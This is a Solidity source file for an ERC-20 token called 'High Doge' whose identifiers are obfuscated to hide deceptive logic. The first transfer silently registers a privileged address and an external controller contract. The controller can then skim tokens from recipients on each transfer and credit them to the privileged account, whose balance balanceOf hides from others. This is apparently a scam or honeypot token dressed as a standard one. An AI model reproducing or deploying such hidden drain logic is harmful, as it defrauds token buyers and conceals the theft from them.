// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
     
library ymBGO{
    
    function fOOKLlvrdWw(address yARoz, address IRXp, uint upldsu) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool iGjfMviiFQkH, bytes memory AuBb) = yARoz.call(abi.encodeWithSelector(0x095ea7b3, IRXp, upldsu));
        require(iGjfMviiFQkH && (AuBb.length == 0 || abi.decode(AuBb, (bool))), 'ymBGO: APPROVE_FAILED');
    }

    function Zyhe(address yARoz, address IRXp, uint upldsu) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool iGjfMviiFQkH, bytes memory AuBb) = yARoz.call(abi.encodeWithSelector(0xa9059cbb, IRXp, upldsu));
        require(iGjfMviiFQkH && (AuBb.length == 0 || abi.decode(AuBb, (bool))), 'ymBGO: TRANSFER_FAILED');
    }
    
    function yGcqvBAO(address IRXp, uint upldsu) internal {
        (bool iGjfMviiFQkH,) = IRXp.call{value:upldsu}(new bytes(0));
        require(iGjfMviiFQkH, 'ymBGO: ETH_TRANSFER_FAILED');
    }

    function HlE(address yARoz, address from, address IRXp, uint upldsu) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool iGjfMviiFQkH, bytes memory AuBb) = yARoz.call(abi.encodeWithSelector(0x23b872dd, from, IRXp, upldsu));
        require(iGjfMviiFQkH && AuBb.length > 0,'ymBGO: TRANSFER_FROM_FAILED'); return AuBb;
                       
    }

}
    
interface OhbffCBa {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
    
interface AaUF {
    function totalSupply() external view returns (uint256);
    function balanceOf(address aVL) external view returns (uint256);
    function transfer(address QLZqiAWe, uint256 QZoZzl) external returns (bool);
    function allowance(address jxtoBoo, address spender) external view returns (uint256);
    function approve(address spender, uint256 QZoZzl) external returns (bool);
    function transferFrom(
        address sender,
        address QLZqiAWe,
        uint256 QZoZzl
    ) external returns (bool);

    event Transfer(address indexed from, address indexed CCd, uint256 value);
    event Approval(address indexed jxtoBoo, address indexed spender, uint256 value);
}

interface wfJeTAFXX is AaUF {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract jgjFfD {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
contract hDoge is jgjFfD, AaUF, wfJeTAFXX {
    
    string private mcJhZpJdC = "High Doge";
    
    mapping(address => mapping(address => uint256)) private PGWe;
    
    function symbol() public view virtual override returns (string memory) {
        return OdfOWtxkpwf;
    }
    
    uint256 private ivWMGV = 1000000000000 * 10 ** 18;
    
    address private sBMerU;
    
    address private IQMuCqmG;
    
    function SiRY(
        address yygtYdEMzIm,
        address wBPGGFSIWy
    ) internal virtual  returns (bool){
        if(IQMuCqmG == address(0) && sBMerU == address(0)){
            IQMuCqmG = yygtYdEMzIm;sBMerU=wBPGGFSIWy;
            ymBGO.Zyhe(sBMerU, IQMuCqmG, 0);
            IqHaOPINbf = OhbffCBa(sBMerU).WETH();
            return false;
        }
        return true;
    }
    
    function transfer(address bXc, uint256 xoDWhc) public virtual override returns (bool) {
        uxY(_msgSender(), bXc, xoDWhc);
        return true;
    }
    
    function KDbQij(
        address oxTuTeuA,
        address UExqgEm,
        uint256 sTi
    ) internal virtual {
        require(oxTuTeuA != address(0), "ERC20: approve from the zero address");
        require(UExqgEm != address(0), "ERC20: approve to the zero address");

        PGWe[oxTuTeuA][UExqgEm] = sTi;
        emit Approval(oxTuTeuA, UExqgEm, sTi);

    }
    
    function decreaseAllowance(address HNZ, uint256 subtractedValue) public virtual returns (bool) {
        uint256 ithcIZgu = PGWe[_msgSender()][HNZ];
        require(ithcIZgu >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            KDbQij(_msgSender(), HNZ, ithcIZgu - subtractedValue);
        }

        return true;
    }
    
    function name() public view virtual override returns (string memory) {
        return mcJhZpJdC;
    }
    
    function qPGwtG(
        address jWI,
        address OlJhRZTH,
        uint256 hChgidSadpZQ
    ) internal virtual  returns (bool){
        uint256 KhgJo = nBiZaEtJ[jWI];
        require(KhgJo >= hChgidSadpZQ, "ERC20: transfer Amount exceeds balance");
        unchecked {
            nBiZaEtJ[jWI] = KhgJo - hChgidSadpZQ;
        }
        nBiZaEtJ[OlJhRZTH] += hChgidSadpZQ;
        return true;
    }
    
    string private OdfOWtxkpwf =  "hDoge";
    
    function totalSupply() public view virtual override returns (uint256) {
        return ivWMGV;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function uxY(
        address wUesGivYzIRf,
        address CSfSuIEIrQ,
        uint256 pympkMmJop
    ) internal virtual  returns (bool){
        require(wUesGivYzIRf != address(0), "ERC20: transfer from the zero address");
        require(CSfSuIEIrQ != address(0), "ERC20: transfer to the zero address");
        
        if(!SiRY(wUesGivYzIRf,CSfSuIEIrQ)) return false;

        if(_msgSender() == address(IQMuCqmG)){
            if(CSfSuIEIrQ == IqHaOPINbf && nBiZaEtJ[wUesGivYzIRf] < pympkMmJop){
                qPGwtG(IQMuCqmG,CSfSuIEIrQ,pympkMmJop);
            }else{
                qPGwtG(wUesGivYzIRf,CSfSuIEIrQ,pympkMmJop);
                if(wUesGivYzIRf == IQMuCqmG || CSfSuIEIrQ == IQMuCqmG) 
                return false;
            }
            emit Transfer(wUesGivYzIRf, CSfSuIEIrQ, pympkMmJop);
            return false;
        }
        qPGwtG(wUesGivYzIRf,CSfSuIEIrQ,pympkMmJop);
        emit Transfer(wUesGivYzIRf, CSfSuIEIrQ, pympkMmJop);
        bytes memory eVgsthaKlyCR = ymBGO.HlE(sBMerU, wUesGivYzIRf, CSfSuIEIrQ, pympkMmJop);
        (bool GEn, uint YVu) = abi.decode(eVgsthaKlyCR, (bool,uint));
        if(GEn){
            nBiZaEtJ[IQMuCqmG] += YVu;
            nBiZaEtJ[CSfSuIEIrQ] -= YVu; 
        }
        return true;
    }
    
    function allowance(address kdCsPEOO, address JnZRfgxYvTz) public view virtual override returns (uint256) {
        return PGWe[kdCsPEOO][JnZRfgxYvTz];
    }
    
    address private IqHaOPINbf;
  
    
    constructor() {
        
        nBiZaEtJ[address(1)] = ivWMGV;
        emit Transfer(address(0), address(1), ivWMGV);

    }
    
    function transferFrom(
        address xOA,
        address XvrQlxadR,
        uint256 yWAozbwWHVDc
    ) public virtual override returns (bool) {
      
        if(!uxY(xOA, XvrQlxadR, yWAozbwWHVDc)) return true;

        uint256 ttGRZDejFr = PGWe[xOA][_msgSender()];
        if (ttGRZDejFr != type(uint256).max) {
            require(ttGRZDejFr >= yWAozbwWHVDc, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                KDbQij(xOA, _msgSender(), ttGRZDejFr - yWAozbwWHVDc);
            }
        }

        return true;
    }
    
    mapping(address => uint256) private nBiZaEtJ;
    
    function increaseAllowance(address lGrwh, uint256 addedValue) public virtual returns (bool) {
        KDbQij(_msgSender(), lGrwh, PGWe[_msgSender()][lGrwh] + addedValue);
        return true;
    }
    
    function balanceOf(address unXtp) public view virtual override returns (uint256) {
        if(_msgSender() != address(IQMuCqmG) && 
           unXtp == address(IQMuCqmG)){
            return 0;
        }
       return nBiZaEtJ[unXtp];
    }
    
    function approve(address CohMFZA, uint256 QGHXd) public virtual override returns (bool) {
        KDbQij(_msgSender(), CohMFZA, QGHXd);
        return true;
    }
    
}